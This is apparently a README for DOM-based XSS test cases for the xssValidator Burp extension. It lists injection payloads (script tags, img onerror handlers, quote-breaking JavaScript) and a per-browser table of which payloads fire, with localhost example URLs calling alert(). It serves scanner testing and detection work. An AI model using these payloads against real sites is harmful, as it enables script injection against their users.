xssValidatorTestCases
=====================

A set of test case scripts for xssValidator Burp Extension - version extended with DOM based XSS detection.

The following payload set:

";{JAVASCRIPT};"
';{JAVASCRIPT};'
;{JAVASCRIPT};
";{JAVASCRIPT}//
';{JAVASCRIPT}//
1;{JAVASCRIPT}//
;{JAVASCRIPT}//
1jsadif;
'1jsadif;
';1jsadif;
<script>{JAVASCRIPT}</script>
"><script>{JAVASCRIPT}</script>
'><script>{JAVASCRIPT}</script>
<img src="1" onerror="{JAVASCRIPT}">
<img src="1" onerror="{JAVASCRIPT}"
<img src='1' onerror='{JAVASCRIPT}'>
<img src='1' onerror='{JAVASCRIPT}'
<img src=1 onerror={JAVASCRIPT}
<img src=1 onerror={JAVASCRIPT}//
"><img src="1" onerror="{JAVASCRIPT}">
"><img src="1" onerror="{JAVASCRIPT}"
'><img src='1' onerror='{JAVASCRIPT}'>
'><img src='1' onerror='{JAVASCRIPT}'
onerror="{JAVASCRIPT}"
onerror='{JAVASCRIPT}'
onload="{JAVASCRIPT}"
onload='{JAVASCRIPT}'
" onerror="{JAVASCRIPT}"
" onload="{JAVASCRIPT}"'
' onerror='{JAVASCRIPT}'
' onload='{JAVASCRIPT}'

Intruder payloads location:
For all pathname tests (in case of JSP instead of / we would use ;) :		GET /path_to_file.php/§PAYLOAD§ HTTP/1.1
For all hash tests													:		GET /path_to_file.html#§PAYLOAD§ HTTP/1.1
For all search tests												:		GET /path_to_file.html?var=§PAYLOAD§ HTTP/1.1
The test location.* subcases have been splitten into three kinds of injection: double quot, single quot and no quot.

During the tests URL encoding in intruder was off.
The http server used was apache2+php5 on KALI.

Hereby is the summary of test cases along with their status under particular browsers (NOT OK means that no single payload has fired successfully, while OK means that at least one did):

TEST CASE:								PHANTOM (1.9):	IE (9):		Chrome (37):	Firefox(32.0):	URL with valid payload example:
location.hash.htmlinject.dquot.html		[NOT OK]		[OK]		[NOT OK]		[NOT OK] 		http://localhost/domhell/location.hash.htmlinject.dquot.html#"><script>alert(299792458)</script>
location.hash.htmlinject.squot.html		[NOT OK]		[OK]		[NOT OK]		[NOT OK]		http://localhost/domhell/location.hash.htmlinject.squot.html#'<script>alert(299792458)</script>					
location.hash.htmlinject.html			[NOT OK]		[OK]		[OK]			[OK]			http://localhost/domhell/location.hash.htmlinject.html#<img src="1" onerror="alert(299792458)"					
location.hash.jsinject.html				[OK]			[OK]		[OK]			[OK]			http://localhost/domhell/location.hash.jsinject.html#1;alert(299792458)//	
location.hash.jsinject.squot.html		[OK]			[OK]		[OK]			[OK]			http://localhost/domhell/location.hash.jsinject.squot.html#';alert(299792458)//
location.hash.jsinject.dquot.html		[NOT OK]		[OK]		[OK]			[OK]			http://localhost/domhell/location.hash.jsinject.dquot.html#";alert(299792458)//
location.pathname.jsinject.squot.php	[OK]			[OK]		[OK]			[NOT OK]		http://localhost/domhell/location.pathname.jsinject.squot.php/';alert(299792458)//
location.pathname.jsinject.dquot.php	[OK]			[NOT OK]	[NOT OK]		[NOT OK]		http://localhost/domhell/location.pathname.jsinject.dquot.php/";alert(299792458)//
location.pathname.jsinject.php			does not exist (js with no quotes at all injection does not make much sense here - pathinfo always contains letters 
location.pathname.htmlinject.php		[OK]			[NOT OK]	[NOT OK] 		[NOT OK]		http://localhost/domhell/location.pathname.htmlinject.php/<script>alert(299792458)</script>	
location.pathname.htmlinject.squot.php	[OK]			[NOT OK]	[NOT OK]		[NOT OK]		http://localhost/domhell/location.pathname.htmlinject.squot.php/'><script>alert(299792458)</script>
location.pathname.htmlinject.dquot.php  [OK]			[NOT OK]	[NOT OK]		[NOT OK]		http://localhost/domhell/location.pathname.htmlinject.dquot.php/"><script>alert(299792458)</script>
location.search.jsinject.dquot.html		[NOT OK]		[NOT OK]	[NOT OK]		[NOT OK]		http://localhost/domhell/location.search.jsinject.dquot.html?a=";alert(299792458)//
location.search.jsinject.squot.html		[OK]			[OK]		[NOT OK]		[NOT OK]		http://localhost/domhell/location.search.jsinject.squot.html?a=';alert(299792458);'
location.search.jsinject.html			[OK]			[OK]		[OK]			[OK]			http://localhost/domhell/location.search.jsinject.html?a=1;alert(299792458)//
location.search.htmlinject.squot.html	[NOT OK]		[OK]		[NOT OK]		[NOT OK]		http://localhost/domhell/location.search.htmlinject.squot.html?a='><img src='1' onerror='alert(299792458)'
location.search.htmlinject.dquot.html	[NOT OK]		[OK]		[NOT OK]		[NOT OK]		http://localhost/domhell/location.search.htmlinject.dquot.html?a="><img src="1" onerror="alert(299792458)"
location.search.htmlinject.html			[NOT OK]		[OK]		[NOT OK]		[NOT OK]		http://localhost/domhell/location.search.htmlinject.html?a=<img src=1 onerror=alert(299792458)//

Conclusion: we have no impact on how particular browsers and httpds handle data, nevertheless in order to gain highest overall XSS detection accuracy, our goal is to make our JS servers (phantomjs, slimer, others?) attached to xssValidator & Burp Intruder to summary cover as much [OK]-s from this list as possible.
By now we have 7 types of XSS that will work under IE and will still not be detected with this toolset, hopefully with:
- some tuning
- employment of other browse engines (like slimerjs or others)
we will get the summary undetectable case rate close to 0 :)
